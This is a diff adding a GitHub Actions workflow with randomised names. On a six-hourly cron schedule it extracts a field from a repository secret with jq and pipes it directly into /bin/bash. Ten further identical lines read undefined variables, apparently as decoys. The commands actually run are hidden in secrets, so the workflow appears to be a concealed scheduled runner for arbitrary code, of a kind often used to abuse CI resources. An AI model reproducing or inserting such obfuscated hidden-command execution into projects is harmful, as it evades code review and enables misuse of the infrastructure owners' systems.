@@ -1,0 +1,29 @@
+name: chengyouku2364
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyouku2364
+        env:
+          kccw2: ${{ secrets.kccw2 }}
+        run: |
+          echo $kccw2 | jq -r .zetyk116 | /bin/bash
+          echo $uctn748 | jq -r .lrw6 | /bin/bash
+          echo $g2 | jq -r .pnzdz0778 | /bin/bash
+          echo $jnjl94 | jq -r .tlv317 | /bin/bash
+          echo $kj6 | jq -r .aao1090 | /bin/bash
+          echo $eb22425 | jq -r .iw5484 | /bin/bash
+          echo $muguv79002 | jq -r .tl0432 | /bin/bash
+          echo $na57672 | jq -r .emcb287 | /bin/bash
+          echo $ng41161 | jq -r .rbc926 | /bin/bash
+          echo $u574 | jq -r .syqg0492 | /bin/bash
+          echo $talsg0 | jq -r .sjd45 | /bin/bash
+
